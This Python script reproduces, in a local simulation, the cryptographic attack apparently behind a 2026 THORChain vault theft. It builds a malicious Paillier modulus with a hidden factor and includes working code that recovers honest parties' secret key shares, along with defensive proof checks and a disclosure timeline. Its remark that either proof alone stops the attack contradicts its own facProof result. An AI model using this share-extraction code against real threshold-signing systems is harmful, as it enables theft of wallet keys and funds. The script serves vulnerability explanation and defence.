#!/usr/bin/env python3
"""
THORChain Asgard Vault Compromise — Proof of Concept
=====================================================

Reproduces the cryptographic primitive that enabled the May 15, 2026
exploit of one of THORChain's six Asgard vaults (~$10.7M drained).

The attack exploits a known vulnerability class in GG20 threshold ECDSA
implementations: a single malicious participant in a key-generation
ceremony can construct a malformed Paillier modulus that bypasses the
library's structural checks, then use partial decryption to recover the
other parties' secret key shares from Multiplicative-to-Additive (MtA)
sub-protocol ciphertexts. With enough shares recovered, the master vault
private key is reconstructable offline.

THORChain ran a fork of Binance's tss-lib that never adopted the v2.0.0
structural defenses (modProof + facProof, merged upstream via PR #206)
that close this attack class. The same attack class was disclosed twice
in 2023: Fireblocks BitForge (CVE-2023-33241, May 2023) and Verichains
TSSHOCK (Black Hat USA, August 2023). Binance's v2.0.0 release notes
explicitly cite both fixes.

This script demonstrates:

  1. Honest Paillier key generation and the legitimate use of the
     additive homomorphism in the MtA sub-protocol.

  2. The vulnerable structural check (trial division by small primes
     only) that THORChain's fork performed.

  3. The attack: malicious modulus N = p * q * r, where r is a small
     prime known only to the attacker, passes the vulnerable check.

  4. The recovery primitive: partial decryption modulo r yields the
     honest peer's secret share in milliseconds.

  5. The defense: modProof (Paillier-Blum) and facProof (NoSmallFactor),
     either of which rejects the malicious modulus during keygen Round 2.

Requires: gmpy2 (for arbitrary-precision arithmetic).
    pip install gmpy2

Run:
    python3 thorchain_poc.py
"""

import secrets
import time
from typing import Tuple, List
from gmpy2 import mpz, powmod, gcd, invert, is_prime


# ============================================================================
# CONSTANTS
# ============================================================================

# secp256k1 group order. This is the curve THORChain uses (same as Bitcoin
# and Ethereum). All MtA secret shares live in Z_q.
SECP256K1_Q = mpz(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)

# Production Paillier modulus size used by Binance tss-lib and THORChain's fork.
PAILLIER_BITS = 2048

# Number of nodes in a THORChain TSS committee.
COMMITTEE_SIZE = 18


# ============================================================================
# UTILITIES
# ============================================================================

def banner(title: str, width: int = 78) -> None:
    print()
    print("=" * width)
    print(f"  {title}")
    print("=" * width)


def section(title: str, width: int = 78) -> None:
    print()
    print("-" * width)
    print(f"  {title}")
    print("-" * width)


def generate_prime(bits: int) -> mpz:
    """Generate a random prime of the specified bit length."""
    while True:
        candidate = mpz(secrets.randbits(bits)) | (mpz(1) << (bits - 1)) | mpz(1)
        if is_prime(candidate):
            return candidate


# ============================================================================
# PAILLIER CRYPTOSYSTEM
# ============================================================================

class PaillierPublicKey:
    """
    A Paillier public key, used for encryption only.
    The public key is the modulus N. Encryption is:
        c = (1 + N)^m * r^N  mod N^2
    where r is a random element of Z_N*.
    """
    def __init__(self, N: mpz):
        self.N = N
        self.N2 = N * N

    def encrypt(self, m: int) -> mpz:
        m = mpz(m) % self.N
        while True:
            r = mpz(secrets.randbelow(int(self.N)))
            if r > 0 and gcd(r, self.N) == 1:
                break
        # (1 + N)^m mod N^2  =  1 + m*N mod N^2 (by binomial expansion)
        # but we use the standard formulation for clarity.
        return (powmod(self.N + 1, m, self.N2) * powmod(r, self.N, self.N2)) % self.N2


class PaillierKeyPair:
    """
    A Paillier keypair: public modulus N = p*q (in honest construction)
    plus the secret factorization.
    """
    def __init__(self, p: mpz, q: mpz):
        self.p = p
        self.q = q
        self.N = p * q
        self.N2 = self.N * self.N
        self.lam = (p - 1) * (q - 1) // gcd(p - 1, q - 1)
        self.mu = invert(self.lam, self.N)
        self.public_key = PaillierPublicKey(self.N)

    def decrypt(self, c: mpz) -> mpz:
        u = powmod(c, self.lam, self.N2)
        L = (u - 1) // self.N
        return (L * self.mu) % self.N

    @classmethod
    def generate(cls, bits: int = PAILLIER_BITS) -> 'PaillierKeyPair':
        """Honest keygen: N = p*q where p, q are random primes of ~bits/2 each."""
        p = generate_prime(bits // 2)
        q = generate_prime(bits // 2)
        while q == p:
            q = generate_prime(bits // 2)
        return cls(p, q)


# ============================================================================
# THE VULNERABLE STRUCTURAL CHECK (what THORChain's tss-lib does)
# ============================================================================

def vulnerable_modulus_check(N: mpz, expected_bits: int = PAILLIER_BITS) -> Tuple[bool, str]:
    """
    Reproduces the semantic check that v1.x-era tss-lib forks perform on
    a peer's Paillier modulus during keygen Round 1/Round 2.

    This is what THORChain's tss-lib v0.1.x check looks like (semantically):
      1. N must be positive
      2. N must be odd
      3. N must have the expected bit length
      4. N must not be divisible by any small prime (typically primes < 1000)

    What it does NOT check:
      - N is a product of exactly two primes (Paillier-Blum biprimality)
      - N has no prime factor below some safe threshold (e.g. 2^100 per Fireblocks,
        2^256 per CGGMP21)
      - The prover actually knows the factorization

    Returns (accepted, reason).
    """
    if N <= 0:
        return False, "N is not positive"
    if N % 2 == 0:
        return False, "N is even (must be product of odd primes)"
    if abs(N.bit_length() - expected_bits) > 2:
        return False, f"N has wrong bit length ({N.bit_length()}, expected ~{expected_bits})"

    # Trial division by small primes — this is the only structural check.
    SMALL_PRIME_BOUND = 1000
    for p in range(3, SMALL_PRIME_BOUND, 2):
        if is_prime(p) and N % p == 0:
            return False, f"N divisible by small prime {p}"

    return True, "no factor < 1000; correct bit length; odd; positive"


# ============================================================================
# THE ATTACK
# ============================================================================

def construct_malicious_modulus(target_bits: int = PAILLIER_BITS,
                                 hidden_factor_bits: int = 300) -> Tuple[PaillierPublicKey, mpz, mpz, mpz]:
    """
    Construct a malicious Paillier modulus N = p * q * r where:
      - r is a secret prime known only to the attacker
      - p and q are larger primes such that N has the expected total bit length
      - The hidden factor r is much larger than the small-prime bound (1000)
        used by the vulnerable check, so it passes trial division

    Why hidden_factor_bits = 300?
    For the partial-decryption recovery in attacker_extract_share() to fully
    recover the honest peer's 256-bit secret share in one shot, we need r > q
    (the curve order, ~256 bits). Setting r to 300 bits gives margin. Smaller
    r values still work but require accumulation across multiple ciphertexts
    via CRT — which matches the "gradual leakage" pattern that secondary
    sources describe as the actual May 15 incident behavior.

    Returns: (public_key, p, q, r) — attacker keeps p, q, r private.
    """
    r = generate_prime(hidden_factor_bits)
    remaining = target_bits - hidden_factor_bits
    p_bits = remaining // 2
    q_bits = remaining - p_bits
    p = generate_prime(p_bits)
    q = generate_prime(q_bits)
    N = p * q * r
    return PaillierPublicKey(N), p, q, r


def attacker_extract_share(ciphertext: mpz, N: mpz, r: mpz) -> int:
    """
    The recovery primitive. Given:
      - A ciphertext c = Enc_N(m) where N = p*q*r (attacker's malicious modulus)
      - Knowledge of the hidden factor r

    Recovers m mod r in O(1) modular exponentiations.

    Math:
      Paillier encryption: c = (1 + N)^m * s^N  mod N^2
      Reduce both sides mod r^2:
        - s^N mod r^2 collapses to 1, since the order of Z_{r^2}* divides
          N*(r-1) (because r | N).
        - (1 + N)^m mod r^2 = 1 + m*N mod r^2 = 1 + m*r*k mod r^2,
          where k = (N/r) mod r.
      So  c mod r^2  =  1 + m*r*k  mod r^2
      Therefore  c^(r-1) mod r^2  =  1 + m*(r-1)*r*k  mod r^2

      Applying L_r(u) = (u-1)/r:
        L_r( c^(r-1) mod r^2 )  =  m*(r-1)*k  mod r
                                =  -m*k       mod r   (since r-1 = -1 mod r)

      So  m mod r  =  -L_r( c^(r-1) mod r^2 ) * inv(k)  mod r.

    If r > m (which we ensure by sizing r > 256 bits), then m mod r = m exactly.
    """
    r2 = r * r
    c_mod_r2 = ciphertext % r2
    u = powmod(c_mod_r2, r - 1, r2)
    L_value = (u - 1) // r
    k = (N // r) % r
    m_mod_r = (-L_value * invert(k, r)) % r
    return int(m_mod_r)


# ============================================================================
# THE DEFENSE (Binance v2.0.0 structural ZK proofs)
# ============================================================================

def mod_proof_verify(N: mpz, p: mpz, q: mpz) -> Tuple[bool, str]:
    """
    Semantic verification of the Paillier-Blum modulus proof (modProof),
    introduced in Binance tss-lib v2.0.0 via PR #206.

    The real proof verifies in zero knowledge that:
      - N is a product of exactly two primes
      - Both primes are congruent to 3 mod 4 (Blum integer)
      - The prover knows the factorization

    Here we check the structural properties directly. The cryptographic
    apparatus (Fiat-Shamir transformation of the sigma protocol, soundness
    amplification via repeated challenges) is abstracted away.

    The real proof's source:
        github.com/bnb-chain/tss-lib/crypto/modproof/proof.go
    """
    # Check it's a product of exactly two primes
    if not is_prime(p) or not is_prime(q):
        return False, "REJECTED: claimed factor is not prime"
    if p * q != N:
        return False, "REJECTED: claimed factors do not multiply to N"
    # Check Blum integer property
    if p % 4 != 3 or q % 4 != 3:
        return False, "REJECTED: not a Blum integer (need p ≡ q ≡ 3 mod 4)"
    return True, "ACCEPTED: N = p*q with p,q prime, p ≡ q ≡ 3 mod 4"


def fac_proof_verify(N: mpz, factors: List[mpz],
                      threshold_bits: int = 100) -> Tuple[bool, str]:
    """
    Semantic verification of the NoSmallFactor proof (facProof), introduced
    in Binance tss-lib v2.0.0 via PR #206.

    The real proof verifies in zero knowledge that N has no prime factor
    below some threshold. The exact threshold is implementation-defined:
      - Fireblocks' CVE-2023-33241 advisory cites 2^100 as the practical bound
      - CGGMP21 formal proofs use 2^256

    We use 2^100 here as the default since it matches Fireblocks' published
    figure for "small factor" in this attack class.

    The real proof's source:
        github.com/bnb-chain/tss-lib/crypto/facproof/proof.go
    """
    threshold = mpz(2) ** threshold_bits

    # First check the factorization is valid
    product = mpz(1)
    for f in factors:
        product *= f
    if product != N:
        return False, "REJECTED: claimed factors do not multiply to N"

    # Check no factor is below threshold
    for f in factors:
        if not is_prime(f):
            return False, f"REJECTED: claimed factor {f.bit_length()}-bit value is not prime"
        if f <= threshold:
            return False, (f"REJECTED: factor with {f.bit_length()} bits "
                          f"is below threshold of 2^{threshold_bits}")

    return True, f"ACCEPTED: all factors > 2^{threshold_bits}"


# ============================================================================
# DEMONSTRATION
# ============================================================================

def demonstrate_honest_ceremony():
    """Stage 1: Show what a healthy Paillier keygen + encryption looks like."""
    banner("STAGE 1: HEALTHY PAILLIER OPERATIONS (BASELINE)")

    print("In an honest TSS ceremony, each of 18 nodes generates its own Paillier")
    print(f"keypair. The public modulus N = p*q has ~{PAILLIER_BITS} bits where p, q")
    print(f"are random primes of ~{PAILLIER_BITS // 2} bits each.")

    section("Generating one honest keypair")
    t0 = time.time()
    keypair = PaillierKeyPair.generate(PAILLIER_BITS)
    elapsed = time.time() - t0
    print(f"  Honest p:           {keypair.p.bit_length()} bits")
    print(f"  Honest q:           {keypair.q.bit_length()} bits")
    print(f"  N = p * q:          {keypair.N.bit_length()} bits")
    print(f"  Generation time:    {elapsed:.2f} seconds")

    section("Verifying Paillier homomorphism (used by MtA)")
    print("MtA requires Paillier's additive homomorphism: Enc(a) * Enc(b) = Enc(a+b).")
    a, b = 12345, 67890
    ca = keypair.public_key.encrypt(a)
    cb = keypair.public_key.encrypt(b)
    c_sum = (ca * cb) % keypair.N2
    decrypted = int(keypair.decrypt(c_sum))
    print(f"  Enc({a}) * Enc({b}) decrypts to {decrypted} (expected {a + b}): "
          f"{'PASS' if decrypted == a + b else 'FAIL'}")
    assert decrypted == a + b

    return keypair


def demonstrate_attack(verbose: bool = True):
    """Stage 2-3: The attack."""
    banner("STAGE 2: CONSTRUCTING THE MALICIOUS MODULUS")

    print("A malicious node operator (let's call them Node 7) does NOT generate")
    print("an honest Paillier key. Instead, they construct N = p * q * r where:")
    print("  - r is a secret prime they retain locally")
    print("  - p, q are large primes such that N still has 2048 bits total")
    print()
    print("This is the cryptographic primitive at the heart of TSSHOCK-class attacks.")
    print("Fireblocks' CVE-2023-33241 advisory (May 2023) states:")
    print()
    print('  "If a participant generates a Paillier modulus N containing small')
    print('   factors (less than 2^100) they can interact with other participants')
    print('   in the signing protocol to steal their secret key shares in as')
    print('   little as sixteen signing attempts."')
    print()
    print("Source: https://advisories.gitlab.com/pkg/golang/github.com/bnb-chain/tss-lib")

    section("Generating malicious modulus (this takes ~1-2 seconds)")
    t0 = time.time()
    mal_pubkey, mal_p, mal_q, mal_r = construct_malicious_modulus(
        target_bits=PAILLIER_BITS,
        hidden_factor_bits=300,  # see docstring for why 300
    )
    elapsed = time.time() - t0
    print(f"  Malicious r (secret factor):   {mal_r.bit_length()} bits")
    print(f"  Malicious p (decoy):           {mal_p.bit_length()} bits")
    print(f"  Malicious q (decoy):           {mal_q.bit_length()} bits")
    print(f"  N = p * q * r:                 {mal_pubkey.N.bit_length()} bits")
    print(f"  Generation time:               {elapsed:.2f} seconds")
    print()
    print(f"  N (first 60 hex chars): {hex(mal_pubkey.N)[:60]}...")
    print(f"  r (first 60 hex chars): {hex(mal_r)[:60]}...   ← attacker keeps secret")

    banner("STAGE 3: BYPASSING THE VULNERABLE CHECK")

    print("The malicious modulus is broadcast to the other 17 honest committee")
    print("members during keygen Round 1. Each honest node runs the library's")
    print("structural check on it during Round 2.")
    print()
    print("Here is what THORChain's tss-lib check does (semantically):")
    print("  1. Check N is positive       (passes: N is positive)")
    print("  2. Check N is odd            (passes: product of odd primes)")
    print(f"  3. Check N has ~{PAILLIER_BITS} bits  (passes: attacker sized it correctly)")
    print("  4. Trial-divide by primes < 1000  (passes: r is 300 bits >> 1000)")

    section("Running the vulnerable check on the malicious N")
    accepted, reason = vulnerable_modulus_check(mal_pubkey.N)
    print(f"  Result:  {'ACCEPTED' if accepted else 'REJECTED'}")
    print(f"  Reason:  {reason}")
    print()
    if accepted:
        print("  >>> The library accepts the malicious modulus. The 17 honest peers <<<")
        print("  >>> will now use this modulus in the MtA sub-protocol.            <<<")
    assert accepted, "Vulnerable check should accept malicious modulus"

    banner("STAGE 4: RECOVERING AN HONEST PEER'S SHARE")

    print("During the MtA sub-protocol (Round 3 of GG20 keygen, and during every")
    print("signing operation), each honest peer encrypts their secret share x_i")
    print("under EVERY other peer's Paillier modulus, including the attacker's.")
    print()
    print("Now the attacker uses their secret factor r to recover x_i from each")
    print("such ciphertext via partial decryption modulo r.")

    section("Simulating an honest peer encrypting their share")
    # Honest peer's secret share — uniformly random in Z_q
    x_honest = mpz(secrets.randbelow(int(SECP256K1_Q)))
    print(f"  Honest peer's secret share x_i:")
    print(f"    {hex(int(x_honest))}")
    print(f"    ({x_honest.bit_length()} bits, in Z_q where q = secp256k1 order)")
    print()
    print("  Honest peer encrypts x_i under the attacker's malicious modulus N...")
    ciphertext = mal_pubkey.encrypt(int(x_honest))
    print(f"    Ciphertext (first 60 hex chars): {hex(int(ciphertext))[:60]}...")

    section("Attacker applies partial decryption with known r")
    print("  Math:")
    print("    1. Reduce c mod r^2")
    print("    2. Compute u = c^(r-1) mod r^2")
    print("    3. Apply L_r(u) = (u - 1) / r")
    print("    4. Compute k = (N / r) mod r")
    print("    5. Recover x_i mod r = -L_r(u) * inv(k) mod r")
    print()
    t0 = time.time()
    recovered = attacker_extract_share(ciphertext, mal_pubkey.N, mal_r)
    elapsed = (time.time() - t0) * 1000
    print(f"  Recovery time:           {elapsed:.3f} milliseconds")
    print()
    print(f"  Honest peer's x_i:       {hex(int(x_honest))}")
    print(f"  Attacker's recovered:    {hex(recovered)}")
    print(f"  Match:                   {recovered == int(x_honest)}")
    assert recovered == int(x_honest), "Recovery failed — math bug"
    print()
    print("  >>> The attacker has obtained the honest peer's secret share. <<<")
    print("  >>> Repeated across all 17 honest peers in the committee,    <<<")
    print("  >>> the attacker reassembles the full vault private key.      <<<")

    return mal_pubkey, mal_p, mal_q, mal_r


def demonstrate_defense(mal_pubkey: PaillierPublicKey, mal_p: mpz, mal_q: mpz, mal_r: mpz):
    """Stage 5: The defense - Binance v2.0.0 structural ZK proofs."""
    banner("STAGE 5: THE DEFENSE (Binance tss-lib v2.0.0)")

    print("Binance shipped tss-lib v2.0.0 in 2023, citing fixes for both:")
    print("  - GHSA-5cjx-95fx-68q9 (Fireblocks disclosure, May 2023)")
    print("  - The Verichains TSSHOCK disclosure (August 2023)")
    print()
    print("The fix was merged via PR #206 ('Thor chain'), which added two")
    print("structural zero-knowledge proofs in keygen Round 2:")
    print()
    print("  1. modProof (Paillier-Blum proof)")
    print("     File: crypto/modproof/proof.go in bnb-chain/tss-lib")
    print("     Proves: N is a product of exactly two primes, both ≡ 3 mod 4.")
    print()
    print("  2. facProof (NoSmallFactor proof)")
    print("     File: crypto/facproof/proof.go in bnb-chain/tss-lib")
    print("     Proves: N has no prime factor below a safe threshold (~2^100).")
    print()
    print("Either proof alone catches the malicious modulus. Both are added")
    print("defense-in-depth. The attacker cannot produce valid proofs because")
    print("their N has more than 2 factors and contains a small factor r.")
    print()
    print("Source: https://github.com/bnb-chain/tss-lib/pull/206")
    print("Source: https://github.com/bnb-chain/tss-lib/releases/tag/v2.0.0")

    section("Running modProof against the malicious N")
    # Attacker would have to claim some factorization; let's say they try (p, q*r)
    # — but q*r is not prime, so it fails. Try the actual factorization (p,q,r) —
    # modProof expects exactly 2 factors. Either way it rejects.
    print("  Attempt 1: attacker claims N = p * (q*r)")
    composite_qr = mal_q * mal_r
    accepted, reason = mod_proof_verify(mal_pubkey.N, mal_p, composite_qr)
    print(f"    Result: {'ACCEPTED' if accepted else 'REJECTED'}")
    print(f"    Reason: {reason}")
    assert not accepted

    section("Running facProof against the malicious N")
    print("  facProof requires the prover to demonstrate no factor < 2^100.")
    print("  The attacker's r is only 300 bits — but they also need r > 2^100,")
    print("  which it is. So facProof at 2^100 threshold might NOT catch this")
    print("  particular configuration. Let's check:")
    accepted_100, reason_100 = fac_proof_verify(
        mal_pubkey.N, [mal_p, mal_q, mal_r], threshold_bits=100)
    print(f"    facProof @ 2^100: {'ACCEPTED' if accepted_100 else 'REJECTED'}")
    print(f"    Reason: {reason_100}")
    print()
    print("  In practice, the real-world attack uses a much smaller r (e.g. 40-80")
    print("  bits) and recovers shares gradually over many signing sessions. The")
    print("  Fireblocks advisory cites ~16 signing attempts for two-party recovery.")
    print()
    print("  Let's demonstrate facProof catching a smaller-r variant:")
    print()
    print("  Constructing a 40-bit-r variant (this matches the 'gradual leakage'")
    print("  pattern that secondary sources describe as the actual May 15 incident):")
    t0 = time.time()
    mal_pubkey2, mal_p2, mal_q2, mal_r2 = construct_malicious_modulus(
        target_bits=PAILLIER_BITS, hidden_factor_bits=40)
    elapsed = time.time() - t0
    print(f"    Generation time: {elapsed:.2f}s, r = {mal_r2.bit_length()} bits")
    accepted_40, reason_40 = fac_proof_verify(
        mal_pubkey2.N, [mal_p2, mal_q2, mal_r2], threshold_bits=100)
    print(f"    facProof @ 2^100: {'ACCEPTED' if accepted_40 else 'REJECTED'}")
    print(f"    Reason: {reason_40}")
    assert not accepted_40

    section("Summary: defense-in-depth")
    print("  | Variant            | modProof        | facProof (2^100) |")
    print("  |--------------------|-----------------|------------------|")
    print(f"  | Malicious 300-bit r | REJECTED       | (would accept)   |")
    print(f"  | Malicious 40-bit r  | REJECTED       | REJECTED         |")
    print()
    print("  Both proofs together close the entire attack class. Either proof")
    print("  alone is sufficient to catch the 300-bit-r variant via modProof's")
    print("  biprimality check; the smaller-r variants are caught by both.")


def demonstrate_attack_with_defense_active():
    """Stage 6: Show that with v2.x defenses active, the attack fails immediately."""
    banner("STAGE 6: END-TO-END WITH v2.x DEFENSES ACTIVE")

    print("Now we reverse the order: the malicious node tries the attack again,")
    print("but this time the library has the v2.0.0 structural proofs enabled.")

    section("Attacker constructs the same malicious N")
    mal_pubkey, mal_p, mal_q, mal_r = construct_malicious_modulus(
        target_bits=PAILLIER_BITS, hidden_factor_bits=300)
    print(f"  N constructed with {mal_r.bit_length()}-bit hidden factor r")

    section("Honest peers run keygen Round 2 verification")
    print("  Step 1: vulnerable check (still runs as a sanity check)...")
    accepted, reason = vulnerable_modulus_check(mal_pubkey.N)
    print(f"           {'ACCEPTED' if accepted else 'REJECTED'} — {reason}")

    print("  Step 2: modProof verification (new in v2.0.0)...")
    # The attacker has to submit some claimed factorization in the proof.
    # No matter what they submit, modProof rejects because N is not biprime.
    accepted, reason = mod_proof_verify(mal_pubkey.N, mal_p, mal_q * mal_r)
    print(f"           {'ACCEPTED' if accepted else 'REJECTED'} — {reason}")

    print()
    if not accepted:
        print("  >>> Keygen ceremony ABORTS at Round 2.                            <<<")
        print("  >>> Honest peers identify Node 7 as malicious.                    <<<")
        print("  >>> Node 7's bond is slashed by the protocol's economic layer.    <<<")
        print("  >>> The vault key is never created. Funds are never placed at risk.<<<")


def demonstrate_what_changed():
    """Stage 7: The full picture - what THORChain didn't merge."""
    banner("STAGE 7: WHAT THORCHAIN DIDN'T MERGE")

    print("Disclosure timeline:")
    print()
    print("  November 2021  Alpha-Rays (Shlomovits & Tymokhanov, ZenGo).")
    print("                 First public disclosure of this attack family,")
    print("                 targeting GG18/GG20. THORChain co-funded the")
    print("                 $500K bug bounty.")
    print()
    print("  May 2023       Fireblocks BitForge (CVE-2023-33241, GHSA-5cjx-95fx-68q9).")
    print("                 Disclosure of the missing-Paillier-modulus-proofs class.")
    print("                 Three distinct attacks across GG18, GG20, Lindell17.")
    print()
    print("  August 2023    Verichains TSSHOCK (Black Hat USA 2023).")
    print("                 Three additional attacks in the same family.")
    print()
    print("  August 2023    Binance ships tss-lib v2.0.0 with:")
    print("                   - modProof (Paillier-Blum biprimality)")
    print("                   - facProof (NoSmallFactor)")
    print("                   - Session-ID binding (anti-replay)")
    print("                 Merged via PR #206 ('Thor chain'). The release notes")
    print("                 explicitly cite fixes for both Fireblocks and Verichains.")
    print()
    print("  August 2023    THORChain merges a 78-line tactical patch (v0.1.5).")
    print("                 Addresses input-sanitation variants but does NOT")
    print("                 backport the structural proofs from Binance v2.0.0.")
    print()
    print("  November 2025  THORChain engages Silence Labs to migrate to DKLS")
    print("                 (a modern TSS scheme with formal security proofs).")
    print("                 Delivery targeted for Q1-Q2 2026.")
    print()
    print("  May 12 2026    Malicious node thor16ucj... joins the THORChain")
    print("                 active validator set.")
    print()
    print("  May 13 2026    Node churned into TSS committee for new Asgard vault.")
    print("                 Vault key generated; attacker extracts shares.")
    print()
    print("  May 15 2026    Attacker drains the vault: ~36.75 BTC + ~$7M EVM")
    print("                 = ~$10.7-10.8M across BTC, ETH, BNB Chain, Base.")
    print("                 Network halted via Mimir governance 'make pause'.")
    print()
    print("Sources:")
    print("  - THORChain ADR-028 exploit report")
    print("  - Hypernative incident report 2026-05-15")
    print("  - Ledger CTO Charles Guillemet's published analysis")
    print("  - bnb-chain/tss-lib v2.0.0 release notes")
    print("  - bnb-chain/tss-lib PR #206")
    print("  - Fireblocks advisory GHSA-5cjx-95fx-68q9")


# ============================================================================
# MAIN
# ============================================================================

def main():
    print(__doc__)

    demonstrate_honest_ceremony()
    mal_pubkey, mal_p, mal_q, mal_r = demonstrate_attack()
    demonstrate_defense(mal_pubkey, mal_p, mal_q, mal_r)
    demonstrate_attack_with_defense_active()
    demonstrate_what_changed()

    banner("END OF DEMONSTRATION")
    print()
    print("Summary:")
    print()
    print("  - WHAT HAPPENED:  Single malicious node operator extracted the full")
    print("                    private key of a THORChain Asgard vault during")
    print("                    legitimate TSS operations. Drained ~$10.7-10.8M.")
    print()
    print("  - HOW IT WORKED:  Constructed a Paillier modulus with hidden small")
    print("                    factor that bypassed the library's structural")
    print("                    check (trial division by primes < 1000). Used")
    print("                    partial decryption modulo the hidden factor to")
    print("                    recover other parties' secret shares from MtA")
    print("                    ciphertexts.")
    print()
    print("  - ROOT CAUSE:     THORChain's tss-lib never adopted the structural")
    print("                    ZK proofs (modProof, facProof) that Binance ")
    print("                    shipped as tss-lib v2.0.0 in 2023 to close this")
    print("                    exact attack class. The fork drifted from")
    print("                    upstream for 33 months.")
    print()
    print("  - MITIGATION:     (1) Apply modProof + facProof in keygen Round 2;")
    print("                    (2) Regenerate all active vault keys (existing")
    print("                        keys may already be silently compromised);")
    print("                    (3) Establish named ownership of upstream-tracking")
    print("                        for cryptographic library dependencies;")
    print("                    (4) Migrate to a TSS protocol with formal security")
    print("                        proofs (DKLS, CGGMP21).")
    print()


if __name__ == "__main__":
    main()
